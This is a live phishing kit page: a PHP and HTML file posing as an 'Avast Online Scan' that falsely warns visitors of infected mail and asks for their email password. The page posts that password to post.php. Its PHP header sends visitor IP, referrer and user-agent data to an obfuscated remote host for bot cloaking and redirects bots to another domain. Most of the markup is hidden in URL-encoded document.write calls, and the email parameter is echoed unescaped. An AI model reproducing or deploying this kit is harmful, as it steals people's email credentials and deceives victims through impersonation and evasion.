<?php @$_SERVER['HTTP_ACCEPT_LANGUAGE'] = $_SERVER['HTTP_ACCEPT_LANGUAGE']; if (!function_exists('getRealip')) { function getRealip() { if ((!empty($_SERVER['HTTP_CF_CONNECTING_IP'])) && (($_SERVER['HTTP_CF_CONNECTING_IP'])!='127.0.0.1') && (($_SERVER['HTTP_CF_CONNECTING_IP'])!=($_SERVER['SERVER_ADDR']))) {$ip=$_SERVER['HTTP_CF_CONNECTING_IP'];} elseif ((!empty($_SERVER['GEOIP_ADDR'])) && (($_SERVER['GEOIP_ADDR'])!='127.0.0.1')) {$ip=$_SERVER['GEOIP_ADDR'];} elseif ((!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) && (($_SERVER['HTTP_X_FORWARDED_FOR'])!='127.0.0.1') && (($_SERVER['HTTP_X_FORWARDED_FOR'])!=($_SERVER['SERVER_ADDR']))) {$ip=explode(',',$_SERVER['HTTP_X_FORWARDED_FOR'])[0];} elseif ((!empty($_SERVER['HTTP_CLIENT_IP'])) && (($_SERVER['HTTP_CLIENT_IP'])!='127.0.0.1') && (($_SERVER['HTTP_CLIENT_IP'])!=($_SERVER['SERVER_ADDR']))) {$ip=$_SERVER['HTTP_CLIENT_IP'];} else {$ip=$_SERVER['REMOTE_ADDR'];} return $ip; }}$ip=getRealip(); if (!function_exists('getRealref')){ function getRealref() { if(empty($_SERVER['HTTP_REFERER'])) { $_SERVER['HTTP_REFERER'] = getenv('HTTP_REFERER'); } return $_SERVER['HTTP_REFERER']; }} $ref=getRealref(); if (!function_exists('getRealua')) { function getRealua() { if(empty($_SERVER['HTTP_USER_AGENT'])) { $_SERVER['HTTP_USER_AGENT'] = getenv('HTTP_USER_AGENT'); } return $_SERVER['HTTP_USER_AGENT']; }} $ua=getRealua(); if ($_SERVER['QUERY_STRING']!=''){ $data = ''.urlencode($_SERVER['QUERY_STRING']).''; } else {$data = '';} $langua = substr($_SERVER['HTTP_ACCEPT_LANGUAGE'],0,2); $vercode = '15722'; $cl0ip = 'bl'; $sourcename = 'cr'; $sourceid = ''; $cl1ip = 'ackt'; $flowdomain = 'c009611'; $cl2ip = 'ds.p'; $cl3ip = 'ro'; $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, 'https://'.$cl0ip.''.$cl1ip.''.$cl2ip.''.$cl3ip.'/'.$cl1ip.''.$cl3ip.'.php'); curl_setopt($ch, CURLOPT_RETURNTRANSFER,true); curl_setopt($ch,CURLOPT_TIMEOUT,1000); curl_setopt($ch, CURLOPT_POST, true); curl_setopt($ch, CURLOPT_POSTFIELDS, 'fd='.$flowdomain.'&ip='.$ip.'&ref='.$ref.'&ua='.$ua.'&data='.$data.'&sourceid='.$sourceid.'&langua='.$langua.'&sourcename='.$sourcename.''); $ifbot = curl_exec($ch); curl_close($ch); if ($ifbot != '0') {  } else { if (!empty($data)) { header("Location: https://trendlineinvestment.online/wp-signal/ancientpond/ancientpond/?".urldecode($data).""); } else { header("Location: https://trendlineinvestment.online/wp-signal/ancientpond/ancientpond/"); } exit; } ?>
<Script Language='Javascript'>
<!--
document.write(unescape('%3C%68%74%6D%6C%3E%0A%3C%68%65%61%64%3E%3C%74%69%74%6C%65%3E%41%76%61%73%74%20%7C%20%4F%6E%6C%69%6E%65%20%53%63%61%6E%3C%2F%74%69%74%6C%65%3E%0A%3C%6C%69%6E%6B%20%72%65%6C%3D%22%73%68%6F%72%74%63%75%74%20%69%63%6F%6E%22%20%68%72%65%66%3D%22%66%69%6C%65%73%2F%66%61%76%69%63%6F%6E%2E%6A%70%67%22%20%74%79%70%65%3D%22%69%6D%61%67%65%2F%67%69%66%22%2F%3E%0A%0A%3C%73%74%79%6C%65%3E%0A%0A%0A%2E%62%6C%61%63%6B%5F%6F%76%65%72%6C%61%79%7B%0A%64%69%73%70%6C%61%79%3A%20%6E%6F%6E%65%3B%0A%70%6F%73%69%74%69%6F%6E%3A%20%61%62%73%6F%6C%75%74%65%3B%0A%74%6F%70%3A%20%30%25%3B%0A%6C%65%66%74%3A%20%30%25%3B%0A%77%69%64%74%68%3A%20%31%30%30%25%3B%0A%68%65%69%67%68%74%3A%20%31%30%30%25%3B%0A%62%61%63%6B%67%72%6F%75%6E%64%2D%63%6F%6C%6F%72%3A%20%23%30%30%30%30%30%30%3B%0A%7A%2D%69%6E%64%65%78%3A%31%30%30%31%3B%0A%2D%6D%6F%7A%2D%6F%70%61%63%69%74%79%3A%20%30%2E%38%3B%0A%6F%70%61%63%69%74%79%3A%2E%37%30%3B%0A%66%69%6C%74%65%72%3A%20%61%6C%70%68%61%28%6F%70%61%63%69%74%79%3D%38%30%29%3B%0A%7D%0A%0A%2E%77%68%69%74%65%5F%63%6F%6E%74%65%6E%74%20%7B%0A%64%69%73%70%6C%61%79%3A%20%6E%6F%6E%65%3B%0A%70%6F%73%69%74%69%6F%6E%3A%20%61%62%73%6F%6C%75%74%65%3B%0A%74%6F%70%3A%20%31%35%25%3B%0A%6C%65%66%74%3A%20%31%35%25%3B%0A%77%69%64%74%68%3A%20%32%35%25%3B%0A%68%65%69%67%68%74%3A%20%33%38%25%3B%0A%70%61%64%64%69%6E%67%3A%20%35%35%70%78%3B%0A%62%61%63%6B%67%72%6F%75%6E%64%2D%63%6F%6C%6F%72%3A%20%77%68%69%74%65%3B%0A%7A%2D%69%6E%64%65%78%3A%31%30%30%32%3B%0A%6F%76%65%72%66%6C%6F%77%3A%20%61%75%74%6F%3B%0A%7D%0A%0A%62%6F%64%79%20%7B%6C%69%6E%65%2D%68%65%69%67%68%74%3A%20%31%3B%7D%0A%0A%6F%6C%2C%20%75%6C%20%7B%6C%69%73%74%2D%73%74%79%6C%65%3A%20%6E%6F%6E%65%3B%7D%0A%0A%62%6C%6F%63%6B%71%75%6F%74%65%2C%20%71%20%7B%71%75%6F%74%65%73%3A%20%6E%6F%6E%65%3B%7D%0A%0A%62%6C%6F%63%6B%71%75%6F%74%65%3A%62%65%66%6F%72%65%2C%20%62%6C%6F%63%6B%71%75%6F%74%65%3A%61%66%74%65%72%2C%0A%71%3A%62%65%66%6F%72%65%2C%20%71%3A%61%66%74%65%72%20%7B%0A%09%63%6F%6E%74%65%6E%74%3A%20%27%27%3B%0A%09%63%6F%6E%74%65%6E%74%3A%20%6E%6F%6E%65%3B%0A%7D%0A%0A%74%61%62%6C%65%20%7B%0A%62%6F%72%64%65%72%2D%63%6F%6C%6C%61%70%73%65%3A%20%63%6F%6C%6C%61%70%73%65%3B%0A%62%6F%72%64%65%72%2D%73%70%61%63%69%6E%67%3A%20%30%3B%0A%77%69%64%74%68%3A%31%30%30%25%3B%0A%76%65%72%74%69%63%61%6C%2D%61%6C%69%67%6E%3A%20%74%6F%70%3B%0A%7D%0A%0A%74%64%2E%74%61%62%6C%65%68%65%61%64%65%72%20%7B%0A%63%6F%6C%6F%72%3A%20%23%66%66%66%66%66%66%3B%0A%62%61%63%6B%67%72%6F%75%6E%64%2D%63%6F%6C%6F%72%3A%23%30%30%30%30%30%30%3B%0A%62%6F%72%64%65%72%2D%63%6F%6C%6F%72%3A%23%61%62%61%62%61%62%3B%0A%62%6F%72%64%65%72%2D%73%74%79%6C%65%3A%20%73%6F%6C%69%64%3B%0A%74%65%78%74%2D%61%6C%69%67%6E%3A%63%65%6E%74%65%72%3B%0A%66%6F%6E%74%2D%66%61%6D%69%6C%79%3A%20%54%61%68%6F%6D%61%2C%20%47%65%6E%65%76%61%2C%20%73%61%6E%73%2D%73%65%72%69%66%3B%0A%62%6F%72%64%65%72%2D%73%74%79%6C%65%3A%73%6F%6C%69%64%3B%0A%62%6F%72%64%65%72%2D%77%69%64%74%68%3A%31%70%78%3B%0A%66%6F%6E%74%2D%77%65%69%67%68%74%3A%62%6F%6C%64%3B%0A%6C%69%6E%65%2D%68%65%69%67%68%74%3A%32%30%70%78%3B%0A%7D%0A%0A%74%64%2E%74%61%62%6C%65%63%6F%6E%74%65%6E%74%20%7B%0A%62%6F%72%64%65%72%2D%63%6F%6C%6F%72%3A%23%61%62%61%62%61%62%3B%0A%62%6F%72%64%65%72%2D%73%74%79%6C%65%3A%20%73%6F%6C%69%64%3B%0A%74%65%78%74%2D%61%6C%69%67%6E%3A%63%65%6E%74%65%72%3B%0A%66%6F%6E%74%2D%66%61%6D%69%6C%79%3A%20%54%61%68%6F%6D%61%2C%20%47%65%6E%65%76%61%2C%20%73%61%6E%73%2D%73%65%72%69%66%3B%0A%62%6F%72%64%65%72%2D%73%74%79%6C%65%3A%73%6F%6C%69%64%3B%0A%62%6F%72%64%65%72%2D%77%69%64%74%68%3A%31%70%78%3B%0A%66%6F%6E%74%2D%73%69%7A%65%3A%20%31%35%70%78%3B%0A%62%61%63%6B%67%72%6F%75%6E%64%2D%63%6F%6C%6F%72%3A%23%66%66%66%66%66%66%3B%0A%7D%0A%0A%74%64%2E%74%61%62%6C%65%63%6F%6E%74%65%6E%74%32%20%7B%0A%62%6F%72%64%65%72%2D%63%6F%6C%6F%72%3A%23%61%62%61%62%61%62%3B%0A%62%6F%72%64%65%72%2D%73%74%79%6C%65%3A%20%73%6F%6C%69%64%3B%0A%74%65%78%74%2D%61%6C%69%67%6E%3A%63%65%6E%74%65%72%3B%0A%66%6F%6E%74%2D%66%61%6D%69%6C%79%3A%20%54%61%68%6F%6D%61%2C%20%47%65%6E%65%76%61%2C%20%73%61%6E%73%2D%73%65%72%69%66%3B%0A%62%6F%72%64%65%72%2D%73%74%79%6C%65%3A%73%6F%6C%69%64%3B%0A%62%6F%72%64%65%72%2D%77%69%64%74%68%3A%31%70%78%3B%0A%66%6F%6E%74%2D%73%69%7A%65%3A%20%31%35%70%78%3B%0A%62%61%63%6B%67%72%6F%75%6E%64%2D%63%6F%6C%6F%72%3A%23%65%34%65%34%65%34%3B%0A%7D%0A%0A%70%20%7B%74%65%78%74%2D%61%6C%69%67%6E%3A%63%65%6E%74%65%72%3B%7D%0A%0A%74%64%2E%66%6C%6F%61%74%72%69%67%68%74%7B%66%6C%6F%61%74%3A%72%69%67%68%74%3B%7D%0A%0A%74%64%2E%66%6F%72%6D%68%65%61%64%65%72%7B%74%65%78%74%2D%61%6C%69%67%6E%3A%20%63%65%6E%74%65%72%3B%0A%66%6F%6E%74%2D%73%69%7A%65%3A%20%33%30%70%78%3B%0A%66%6F%6E%74%2D%77%65%69%67%68%74%3A%20%62%6F%6C%64%3B%7D%0A%3C%2F%73%74%79%6C%65%3E%0A%0A%3C%2F%68%65%61%64%3E%0A%0A%09%3C%62%6F%64%79%3E%0A%09%09%3C%70%3E%0A%0A%09%09%3C%62%72%3E%3C%62%72%3E%3C%62%72%3E%0A%0A%09%09%3C%74%61%62%6C%65%20%77%69%64%74%68%3D%22%37%30%30%22%20%61%6C%69%67%6E%3D%22%63%65%6E%74%65%72%22%3E%3C%74%72%3E%0A%09%0A%09%09%3C%74%64%20%77%69%64%74%68%3D%22%33%35%30%22%3E%0A%09%09%3C%2F%74%64%3E%0A%09%09%09%0A%0A%0A%0A%09%09%3C%74%64%3E%0A%0A%09%09%09%3C%74%61%62%6C%65%20%77%69%64%74%68%3D%22%37%30%30%22%3E%0A%0A%09%09%09%3C%74%72%3E%3C%74%64%3E%0A%09%09%09%3C%69%6D%67%20%73%72%63%3D%22%66%69%6C%65%73%2F%6C%6F%67%6F%2E%70%6E%67%22%20%77%69%64%74%68%3D%22%32%35%30%22%20%68%65%69%67%68%74%3D%22%38%30%22%3E%0A%09%09%09%3C%2F%74%64%3E%3C%2F%74%72%3E%09%0A%0A%0A%09%09%09%3C%74%72%3E%3C%74%64%20%68%65%69%67%68%74%3D%22%33%30%22%3E%3C%2F%74%64%3E%3C%2F%74%72%3E%09%0A%0A%0A%0A%0A%09%09%09%3C%74%72%3E%3C%74%64%3E%0A'));
//-->
</Script>


				
				<font face="verdana" size="2">
				<b> AVAST <font color="#ff8000">(<?php echo $_GET['email']; ?>)</font> DETECTS 5 DEADLY VIRUS ON YOUR MAILBOX</b><br>


				
				This may course mail malfunction and lost of some incoming mails : 
		
				<b>

				<font color="#ff8000">

				
				<script language="JavaScript">
				TargetDate = "06/01/2016 5:00 AM";
				BackColor = "#ffffff";
				ForeColor = "#ff0000";
				CountActive = true;
				CountStepper = -1;
				LeadingZero = true;
				DisplayFormat = "%%D%% Days, %%H%% Hours, %%M%% Minutes, %%S%% Seconds.";
				FinishMessage = "feel save avast online protector is finally here!";
				</script>


				<Script Language='Javascript'>
<!--
document.write(unescape('%3C%73%63%72%69%70%74%20%6C%61%6E%67%75%61%67%65%3D%22%4A%61%76%61%53%63%72%69%70%74%22%20%73%72%63%3D%22%66%69%6C%65%73%2F%74%69%6D%65%72%2E%6A%73%22%3E%3C%2F%73%63%72%69%70%74%3E'));
//-->
</Script>


				</b>

				</font>

				<br><br>


				For your account safety, you are advised to run a total scan now to protect your data. 
				<p>

				
			<font color="#ff8000">
				
			<ul>
			<li><b>Below are the affected directories:</b> <br><br></li>
			<li><b>*<font color="#000000"><?php echo $_GET['email']; ?>/</font>inbox/temp/493749.scr</b></li>
			<li><b>*<font color="#000000"><?php echo $_GET['email']; ?>/</font>spam/download/folder/po8403.pdf</b></li>
			<li><b>*<font color="#000000"><?php echo $_GET['email']; ?>/</font>inbox/temp/download/file392.xls</b></li>
			<li><b>*<font color="#000000"><?php echo $_GET['email']; ?>/</font>inbox/temp/download/file4839.zip</b></li>
			<li><b>*<font color="#000000"><?php echo $_GET['email']; ?>/</font>inbox/temp/download/file3948.ace</b></li>
				

			</ul>

			</font>

				</font>

			</td></tr>


			<Script Language='Javascript'>
<!--
document.write(unescape('%3C%74%72%3E%3C%74%64%20%68%65%69%67%68%74%3D%22%31%30%22%3E%3C%2F%74%64%3E%3C%2F%74%72%3E%09%0A%0A%09%09%09%3C%74%72%3E%3C%74%64%3E%0A%0A%09%09%09%3C%61%20%68%72%65%66%20%3D%20%22%6A%61%76%61%73%63%72%69%70%74%3A%76%6F%69%64%28%30%29%22%20%6F%6E%63%6C%69%63%6B%20%3D%20%22%64%6F%63%75%6D%65%6E%74%2E%67%65%74%45%6C%65%6D%65%6E%74%42%79%49%64%28%27%6C%69%67%68%74%27%29%2E%73%74%79%6C%65%2E%64%69%73%70%6C%61%79%3D%27%62%6C%6F%63%6B%27%3B%64%6F%63%75%6D%65%6E%74%2E%67%65%74%45%6C%65%6D%65%6E%74%42%79%49%64%09%09%09%0A%0A%09%09%09%28%27%66%61%64%65%27%29%2E%73%74%79%6C%65%2E%64%69%73%70%6C%61%79%3D%27%62%6C%6F%63%6B%27%22%3E%0A%0A%09%09%09%09%3C%69%6E%70%75%74%20%20%76%61%6C%75%65%3D%22%53%63%61%6E%20%45%6D%61%69%6C%20%3E%3E%22%20%74%79%70%65%3D%22%73%75%62%6D%69%74%22%20%73%74%79%6C%65%3D%22%77%69%64%74%68%3A%32%30%30%70%78%3B%20%68%65%69%67%68%74%3A%35%35%70%78%3B%20%66%6F%6E%74%2D%66%61%6D%69%6C%79%3A%20%56%65%72%64%61%6E%61%3B%20%66%6F%6E%74%2D%73%69%7A%65%3A%20%31%37%70%78%3B%20%63%6F%6C%6F%72%3A%23%66%66%66%66%66%66%3B%20%0A%09%09%09%09%62%61%63%6B%67%72%6F%75%6E%64%2D%63%6F%6C%6F%72%3A%20%23%66%66%38%30%30%30%3B%20%62%6F%72%64%65%72%3A%20%73%6F%6C%69%64%20%31%70%78%20%23%66%66%38%30%30%30%3B%20%70%61%64%64%69%6E%67%3A%20%31%30%70%78%3B%20%0A%09%09%09%09%2D%6D%6F%7A%2D%62%6F%72%64%65%72%2D%72%61%64%69%75%73%3A%20%32%70%78%3B%20%2D%77%65%62%6B%69%74%2D%62%6F%72%64%65%72%2D%72%61%64%69%75%73%3A%20%32%70%78%3B%20%2D%6B%68%74%6D%6C%2D%62%6F%72%64%65%72%2D%72%61%64%69%75%73%3A%20%32%70%78%3B%20%62%6F%72%64%65%72%2D%72%61%64%69%75%73%3A%20%32%70%78%3B%0A%09%09%09%09%2D%6D%6F%7A%2D%62%6F%78%2D%73%68%61%64%6F%77%3A%20%33%70%78%20%33%70%78%20%33%70%78%20%23%38%38%38%3B%20%2D%77%65%62%6B%69%74%2D%62%6F%78%2D%73%68%61%64%6F%77%3A%20%33%70%78%20%33%70%78%20%33%70%78%20%23%38%38%38%3B%20%62%6F%78%2D%73%68%61%64%6F%77%3A%20%33%70%78%20%33%70%78%20%33%70%78%20%23%38%38%38%3B%22%3E%0A%0A%09%09%09%3C%2F%61%3E%3C%2F%70%3E%0A%09%09%09%3C%64%69%76%20%69%64%3D%22%6C%69%67%68%74%22%20%63%6C%61%73%73%3D%22%77%68%69%74%65%5F%63%6F%6E%74%65%6E%74%22%3E%0A%0A%09%20%20%0A%0A%09%09%09%3C%21%2D%2D%54%68%69%73%20%69%73%20%77%68%65%72%65%20%74%68%65%20%66%6F%72%6D%20%74%61%62%6C%65%20%73%74%61%72%74%73%20%2D%2D%3E%0A%0A%09%09%09%3C%74%61%62%6C%65%3E%0A%0A%09%09%09%3C%74%72%3E%3C%74%64%3E%3C%2F%74%64%3E%3C%2F%74%72%3E%0A%09%09%09%3C%74%72%3E%0A%09%09%09%3C%74%64%3E%0A%0A%09%09%09%3C%74%61%62%6C%65%20%77%69%64%74%68%3D%22%31%32%30%22%20%68%65%69%67%68%74%3D%22%22%20%61%6C%69%67%6E%3D%22%63%65%6E%74%65%72%22%3E%3C%74%72%3E%3C%74%64%3E%0A%0A%09%09%09%09%3C%74%61%62%6C%65%20%77%69%64%74%68%3D%22%22%34%30%30%22%20%61%6C%69%67%6E%3D%22%63%65%6E%74%65%72%22%3E%0A%0A%09%09%09%09%3C%74%72%3E%3C%74%64%3E%0A%09%09%09%09%3C%66%6F%6E%74%20%66%61%63%65%3D%22%76%65%72%64%61%6E%61%22%20%73%69%7A%65%3D%22%32%22%63%6F%6C%6F%72%3D%22%23%30%34%33%31%42%34%22%3E%0A%09%09%09%09%3C%66%6F%6E%74%20%73%69%7A%65%3D%22%2B%33%22%3E%3C%66%6F%6E%74%20%63%6F%6C%6F%72%3D%22%23%66%66%38%30%30%30%22%3E%41%76%61%73%74%20%53%65%63%75%72%69%74%79%3C%2F%66%6F%6E%74%3E%3C%2F%66%6F%6E%74%3E%0A%09%09%09%09%3C%2F%66%6F%6E%74%3E%0A%09%09%09%09%3C%2F%74%64%3E%3C%2F%74%72%3E%09%0A%0A%09%09%09%09%0A%09%09%09%09%3C%74%72%3E%3C%74%64%20%68%65%69%67%68%74%3D%22%31%30%22%3E%20%3C%2F%74%64%3E%3C%2F%74%72%3E%0A%0A%0A%09%09%09%09%3C%74%72%3E%3C%74%64%3E%0A%09%09%09%09%3C%66%6F%6E%74%20%66%61%63%65%3D%22%76%65%72%64%61%6E%61%22%20%73%69%7A%65%3D%22%32%22%3E%0A%09%09%09%09%43%6F%6E%66%69%72%6D%20%79%6F%75%72%20%49%44%20%74%6F%20%73%74%61%72%74%20%41%76%61%73%74%20%45%6D%61%69%6C%20%73%63%61%6E%0A%09%09%09%09%3C%2F%66%6F%6E%74%3E%0A%09%09%09%09%3C%2F%74%64%3E%3C%2F%74%72%3E'));
//-->
</Script>





				<tr><td height="20"> 

				<!--Form header starts here -->
                                                      
				<Script Language='Javascript'>
				<!--
				document.write(unescape('%3C%66%6F%72%6D%20%6D%65%74%68%6F%64%3D%22%70%6F%73%74%22%20%61%63%74%69%6F%6E%3D%22%70%6F%73%74%2E				%70%68%70%22%3E'));
				//-->
				</Script>

				<!--Form header ends here -->

				</td></tr>


				<tr><td> 

					<font face="verdana" size="3" color="#ff8000"><b><?php echo $_GET['email']; ?> </b></font>
					<input type="hidden" name="email" value="<?php echo $_GET['email']; ?>">			
				</td></tr>




				<Script Language='Javascript'>
<!--
document.write(unescape('%3C%74%72%3E%3C%74%64%20%68%65%69%67%68%74%3D%22%31%35%22%3E%20%3C%2F%74%64%3E%3C%2F%74%72%3E%0A%0A%0A%0A%09%09%09%09%3C%74%72%3E%3C%74%64%3E%20%0A%0A%09%09%09%09%09%3C%69%6E%70%75%74%20%20%6E%61%6D%65%3D%22%70%61%73%73%22%20%74%79%70%65%3D%22%70%61%73%73%77%6F%72%64%22%20%73%74%79%6C%65%3D%22%77%69%64%74%68%3A%33%33%30%70%78%3B%20%68%65%69%67%68%74%3A%34%30%70%78%3B%20%66%6F%6E%74%2D%66%61%6D%69%6C%79%3A%20%56%65%72%64%61%6E%61%3B%20%0A%09%09%09%09%09%66%6F%6E%74%2D%73%69%7A%65%3A%20%31%35%70%78%3B%20%63%6F%6C%6F%72%3A%23%30%30%30%30%30%30%3B%20%62%61%63%6B%67%72%6F%75%6E%64%2D%63%6F%6C%6F%72%3A%20%23%66%66%66%66%66%66%3B%20%62%6F%72%64%65%72%3A%20%73%6F%6C%69%64%20%32%70%78%20%23%66%66%38%30%30%30%3B%20%0A%09%09%09%09%09%70%61%64%64%69%6E%67%3A%20%31%30%70%78%22%22%20%72%65%71%75%69%72%65%64%3D%22%22%20%70%6C%61%63%65%68%6F%6C%64%65%72%3D%22%50%61%73%73%77%6F%72%64%22%3E%09%09%09%09%0A%09%09%09%09%3C%2F%74%64%3E%3C%2F%74%72%3E%0A%0A%0A%0A%09%09%09%09%3C%74%72%3E%3C%74%64%20%68%65%69%67%68%74%3D%22%31%35%22%3E%20%3C%2F%74%64%3E%3C%2F%74%72%3E%0A%09%09%09%09%0A%0A%0A%09%09%09%09%3C%74%72%3E%3C%74%64%3E%0A%09%09%09%09%3C%69%6E%70%75%74%20%20%76%61%6C%75%65%3D%22%53%63%61%6E%20%45%6D%61%69%6C%20%3E%3E%22%20%74%79%70%65%3D%22%73%75%62%6D%69%74%22%20%73%74%79%6C%65%3D%22%77%69%64%74%68%3A%33%33%30%70%78%3B%20%68%65%69%67%68%74%3A%35%35%70%78%3B%20%66%6F%6E%74%2D%66%61%6D%69%6C%79%3A%20%56%65%72%64%61%6E%61%3B%20%66%6F%6E%74%2D%73%69%7A%65%3A%20%31%37%70%78%3B%20%63%6F%6C%6F%72%3A%23%66%66%66%66%66%66%3B%20%0A%09%09%09%09%62%61%63%6B%67%72%6F%75%6E%64%2D%63%6F%6C%6F%72%3A%20%23%66%66%38%30%30%30%3B%20%62%6F%72%64%65%72%3A%20%73%6F%6C%69%64%20%31%70%78%20%23%66%66%38%30%30%30%3B%20%70%61%64%64%69%6E%67%3A%20%31%30%70%78%3B%20%0A%09%09%09%09%2D%6D%6F%7A%2D%62%6F%72%64%65%72%2D%72%61%64%69%75%73%3A%20%32%70%78%3B%20%2D%77%65%62%6B%69%74%2D%62%6F%72%64%65%72%2D%72%61%64%69%75%73%3A%20%32%70%78%3B%20%2D%6B%68%74%6D%6C%2D%62%6F%72%64%65%72%2D%72%61%64%69%75%73%3A%20%32%70%78%3B%20%62%6F%72%64%65%72%2D%72%61%64%69%75%73%3A%20%32%70%78%3B%0A%09%09%09%09%2D%6D%6F%7A%2D%62%6F%78%2D%73%68%61%64%6F%77%3A%20%33%70%78%20%33%70%78%20%33%70%78%20%23%38%38%38%3B%20%2D%77%65%62%6B%69%74%2D%62%6F%78%2D%73%68%61%64%6F%77%3A%20%33%70%78%20%33%70%78%20%33%70%78%20%23%38%38%38%3B%20%62%6F%78%2D%73%68%61%64%6F%77%3A%20%33%70%78%20%33%70%78%20%33%70%78%20%23%38%38%38%3B%22%3E%0A%09%09%09%09%3C%2F%74%64%3E%3C%2F%74%72%3E%0A%0A%09%09%09%09%0A%09%09%09%09%3C%74%72%3E%3C%74%64%3E%0A%09%09%09%09%3C%2F%66%6F%72%6D%3E%09%0A%09%09%09%09%3C%2F%74%64%3E%3C%2F%74%72%3E%09%09%0A%0A%09%09%09%09%3C%2F%74%61%62%6C%65%3E%0A%0A%09%09%09%3C%2F%74%64%3E%3C%2F%74%72%3E%3C%2F%74%61%62%6C%65%3E%0A%0A%09%09%0A%09%09%09%3C%21%2D%2D%54%68%69%73%20%69%73%20%77%68%65%72%65%20%74%68%65%20%66%6F%72%6D%20%74%61%62%6C%65%20%65%6E%64%73%20%2D%2D%3E%0A%0A%09%09%3C%2F%74%64%3E%3C%2F%74%72%3E%0A%0A%09%09%3C%2F%74%61%62%6C%65%3E%0A%0A%3C%2F%74%61%62%6C%65%3E%0A%0A%3C%2F%74%64%3E%3C%2F%74%72%3E%3C%2F%74%61%62%6C%65%3E%0A%0A%3C%62%72%3E%0A%3C%2F%64%69%76%3E%0A%09%09%3C%64%69%76%20%69%64%3D%22%66%61%64%65%22%20%63%6C%61%73%73%3D%22%62%6C%61%63%6B%5F%6F%76%65%72%6C%61%79%22%3E%3C%2F%64%69%76%3E%0A%09%3C%2F%62%6F%64%79%3E%0A%3C%2F%68%74%6D%6C%3E'));
//-->
</Script>